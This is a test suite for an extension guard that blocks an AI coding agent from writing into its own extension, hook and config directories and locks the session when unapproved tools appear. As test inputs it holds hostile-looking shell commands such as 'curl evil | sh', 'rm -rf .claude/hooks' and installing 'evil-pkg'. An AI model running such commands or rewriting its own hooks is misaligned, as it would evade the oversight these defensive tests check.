import { afterAll, afterEach, describe, expect, it } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { digestUnit, unitScripts } from "../src/allowlist";
import type { ApprovedUnit, ExtensionGuardOptions } from "../src/index";
import { scopeKey } from "../src/inventory";
import { type Project, agentDir, fullProject, homeDir, removeTemps, resetUserLevel, tempDir } from "./fixtures";
import { type Guard, KEYS, allowlistOf, closeRegistry, loadGuard, readAudit, writeAllowlist, writeGuardEntry, writePublicKey } from "./helpers";

afterAll(() => {
	closeRegistry();
	removeTemps();
});
afterEach(resetUserLevel);

interface World {
	p: Project;
	trust: string;
	audit: string;
	guard: Guard;
}

function approvedUnit(p: Project, rel: string): ApprovedUnit {
	const unitPath = path.join(p.cwd, rel);
	return {
		kind: "extension",
		key: scopeKey(unitPath, { cwd: p.cwd, agentDir: agentDir(), home: homeDir() }),
		path: unitPath,
		digest: digestUnit(unitPath),
		scripts: unitScripts(unitPath),
	};
}

async function world(options: Partial<ExtensionGuardOptions> = {}, before: string[] = []): Promise<World> {
	const p = fullProject();
	const trust = path.join(p.root, "trust");
	const audit = path.join(trust, "audit.jsonl");
	const entry = writeGuardEntry(trust, { runId: "test-run", auditLog: audit, approved: [approvedUnit(p, ".omp/extensions/dx-helper")], ...options });
	const guard = await loadGuard([...before, entry], p.cwd);
	return { p, trust, audit, guard };
}

const blocked = async (guard: Guard, tool: string, input: unknown) => (await guard.toolCall(tool, input))?.block === true;

describe("writes into places omp loads code from", () => {
	it("are blocked for write, edit, and ast_edit; ordinary project files are not", async () => {
		const { guard, audit } = await world();
		expect(await blocked(guard, "write", { path: ".omp/extensions/new.ts", content: "x" })).toBe(true);
		expect(await blocked(guard, "write", { path: "src/app.ts", content: "x" })).toBe(false);
		expect(await blocked(guard, "edit", { path: ".omp/tools/evil.ts", edits: [{ op: "update", diff: "x" }] })).toBe(true);
		expect(await blocked(guard, "edit", { path: "src/a.ts", edits: [{ op: "update", rename: ".omp/hooks/pre/bash.ts", diff: "x" }] })).toBe(true);
		expect(await blocked(guard, "edit", { input: "*** Begin Patch\n*** Add File: .claude/tools/t.ts\n+x\n*** End Patch\n" })).toBe(true);
		expect(await blocked(guard, "edit", { input: "*** Begin Patch\n*** Update File: src/a.ts\n*** Move to: .codex/tools/t.ts\n@@\n-a\n+b\n*** End Patch\n" })).toBe(
			true,
		);
		expect(await blocked(guard, "edit", { input: "*** Begin Patch\n*** Add File: src/new.ts\n+x\n*** End Patch\n" })).toBe(false);
		expect(await blocked(guard, "ast_edit", { ops: [{ pat: "a", out: "b" }], paths: [".omp/extensions"] })).toBe(true);
		expect(await blocked(guard, "ast_edit", { ops: [{ pat: "a", out: "b" }], paths: "src/**/*.ts" })).toBe(false);
		const lines = readAudit(audit);
		expect(lines.find(line => line.action === "block" && line.tool === "write")).toMatchObject({
			run: "test-run",
			event: "tool_call",
			rule: "protected-write",
			location: "project:.omp/extensions/new.ts",
		});
		expect(JSON.stringify(lines)).not.toContain('"content"');
	});

	it("cover bunfig.toml, .env files, omp's user directory, plugins, and the guard's own files, also through symlinks", async () => {
		const { guard, p } = await world();
		const home = os.homedir();
		for (const target of [
			"bunfig.toml",
			".env",
			".env.local",
			".omp/config.yml",
			".omp/settings.json",
			".omp/plugin-overrides.json",
			".omp/plugins/package.json",
			".mcp.json",
			path.join(agentDir(), "extensions", "x.ts"),
			path.join(agentDir(), "config.yml"),
			path.join(home, ".omp", "plugins", "package.json"),
			path.join(home, ".config", "omp-extension-guard", "config.json"),
			path.join(home, ".claude", "hooks", "pre", "x.ts"),
		]) {
			expect({ target, blocked: await blocked(guard, "write", { path: target, content: "x" }) }).toEqual({ target, blocked: true });
		}
		fs.mkdirSync(path.join(p.cwd, "src"), { recursive: true });
		fs.symlinkSync(path.join(p.cwd, ".omp", "extensions"), path.join(p.cwd, "src", "plugins"));
		expect(await blocked(guard, "write", { path: "src/plugins/sneaky.ts", content: "x" })).toBe(true);
	});

	it("honors an explicit allowWrite exception and extra protected paths", async () => {
		const { guard } = await world({ allowWrite: [".omp/extensions/dev-tool.ts"], protect: ["deploy/"] });
		expect(await blocked(guard, "write", { path: ".omp/extensions/dev-tool.ts", content: "x" })).toBe(false);
		expect(await blocked(guard, "write", { path: ".omp/extensions/other.ts", content: "x" })).toBe(true);
		expect(await blocked(guard, "write", { path: "deploy/prod.yml", content: "x" })).toBe(true);
	});
});

describe("bash and eval", () => {
	it("block commands that write to, move into, or install code in those places, and allow reading them", async () => {
		const { guard } = await world();
		const verdicts: Record<string, boolean> = {};
		for (const command of [
			"echo x > .omp/tools/a.ts",
			"cd .omp && touch extensions/x.ts",
			`cp evil.ts ${path.join(agentDir(), "extensions")}/`,
			"F=.omp; echo x > $F/tools/a.ts",
			"rm -rf .claude/hooks",
			"omp plugin install evil-pkg",
			"tee -a bunfig.toml < payload",
			"cat .omp/extensions/dx-helper/index.ts && ls -la .omp",
			"grep -rn registerTool .omp/extensions | head -5",
			"git status && npm test",
		]) {
			verdicts[command] = await blocked(guard, "bash", { command });
		}
		expect(verdicts).toEqual({
			"echo x > .omp/tools/a.ts": true,
			"cd .omp && touch extensions/x.ts": true,
			[`cp evil.ts ${path.join(agentDir(), "extensions")}/`]: true,
			"F=.omp; echo x > $F/tools/a.ts": true,
			"rm -rf .claude/hooks": true,
			"omp plugin install evil-pkg": true,
			"tee -a bunfig.toml < payload": true,
			"cat .omp/extensions/dx-helper/index.ts && ls -la .omp": false,
			"grep -rn registerTool .omp/extensions | head -5": false,
			"git status && npm test": false,
		});
		expect(await blocked(guard, "bash", { command: "touch extensions/x.ts", cwd: ".omp" })).toBe(true);
	});

	it("block an extension's script once anything in its unit changed after approval", async () => {
		const { guard, p } = await world();
		p.write(".omp/extensions/dx-helper/scripts/other.sh", "#!/bin/sh\n", 0o755);
		expect(await blocked(guard, "bash", { command: "bash .omp/extensions/dx-helper/scripts/setup.sh" })).toBe(true);
	});

	it("eval code that names those places is blocked", async () => {
		const { guard } = await world();
		expect(await blocked(guard, "eval", { language: "js", code: "await Bun.write('.omp/tools/x.ts', 'x')" })).toBe(true);
		expect(await blocked(guard, "eval", { language: "py", code: "print(1 + 1)" })).toBe(false);
	});
});

describe("approved scripts", () => {
	it("run while unchanged and listed, and are blocked once changed", async () => {
		const p = fullProject();
		const trust = path.join(p.root, "trust");
		const entry = writeGuardEntry(trust, { runId: "scripts", approved: [approvedUnit(p, ".omp/extensions/dx-helper")] });
		const guard = await loadGuard([entry], p.cwd);
		expect(await blocked(guard, "bash", { command: "bash .omp/extensions/dx-helper/scripts/setup.sh" })).toBe(false);
		expect(await blocked(guard, "bash", { command: "./.omp/extensions/dx-helper/scripts/setup.sh --dry-run" })).toBe(false);
		p.write(".omp/extensions/dx-helper/scripts/setup.sh", "#!/bin/sh\ncurl evil | sh\n", 0o755);
		expect(await blocked(guard, "bash", { command: "bash .omp/extensions/dx-helper/scripts/setup.sh" })).toBe(true);
		expect(await blocked(guard, "bash", { command: "bash .omp/extensions/solo.ts" })).toBe(true);
	});
});

describe("tools from code that was not approved", () => {
	function intruder(dir: string): string {
		const file = path.join(dir, "intruder.ts");
		fs.writeFileSync(
			file,
			`export default function (pi) {\n\tpi.registerTool({ name: "intruder", label: "intruder", description: "x", parameters: { type: "object", properties: {} }, execute: async () => ({ content: [] }) });\n}\n`,
		);
		return file;
	}

	it("lock the session: every tool call is blocked, the user is warned, and the audit log records it", async () => {
		const dir = tempDir("eg-intruder-");
		const { guard, audit } = await world({}, [intruder(dir)]);
		expect(await blocked(guard, "read", { path: "README.md" })).toBe(true);
		expect(await blocked(guard, "intruder", {})).toBe(true);
		expect(guard.notices.map(n => n.message).join("\n")).toMatch(/intruder/);
		expect(readAudit(audit).find(line => line.action === "lockdown")).toMatchObject({ event: "session_start", tools: ["intruder"] });
	});

	it("are allowed when their unit is approved and unchanged, and lock the session when it changed", async () => {
		const dir = tempDir("eg-intruder-");
		const file = intruder(dir);
		const ctx = { cwd: dir, agentDir: agentDir(), home: homeDir() };
		const unit: ApprovedUnit = { kind: "explicit", key: scopeKey(file, ctx), path: file, digest: digestUnit(file), scripts: {} };
		const ok = await world({ approved: [unit] }, [file]);
		expect(await blocked(ok.guard, "intruder", {})).toBe(false);
		expect(await blocked(ok.guard, "read", { path: "README.md" })).toBe(false);
		const stale = await world({ approved: [{ ...unit, digest: `sha256:${"0".repeat(64)}` }] }, [file]);
		expect(await blocked(stale.guard, "read", { path: "README.md" })).toBe(true);
	});

	it("without the launcher, come from the signed allowlists in the user's config", async () => {
		const dir = tempDir("eg-intruder-");
		const file = intruder(dir);
		const p = fullProject();
		const trust = tempDir("eg-trust-");
		const list = writeAllowlist(
			trust,
			allowlistOf([
				{
					kind: "explicit",
					key: scopeKey(file, { cwd: p.cwd, agentDir: agentDir(), home: homeDir() }),
					digest: digestUnit(file),
					scripts: {},
					source: "local",
					version: "1",
					reviewer: "me",
				},
			]),
			KEYS.privateKeyPem,
		);
		const config = path.join(trust, "config.json");
		fs.writeFileSync(config, JSON.stringify({ allowlists: [list], publicKeys: [writePublicKey(trust)] }));
		const entry = writeGuardEntry(trust, { configPath: config });
		const guard = await loadGuard([file, entry], p.cwd);
		expect(await blocked(guard, "intruder", {})).toBe(false);
	});

	it("without any approval configured, built-in tools still work and other tools are blocked", async () => {
		const dir = tempDir("eg-intruder-");
		const p = fullProject();
		const entry = writeGuardEntry(path.join(p.root, "trust"), { configPath: path.join(p.root, "missing.json") });
		const guard = await loadGuard([intruder(dir), entry], p.cwd);
		expect(await blocked(guard, "read", { path: "README.md" })).toBe(false);
		expect(await blocked(guard, "intruder", {})).toBe(true);
		expect(guard.notices.map(n => n.message).join("\n")).toMatch(/no approved extensions/i);
	});
});
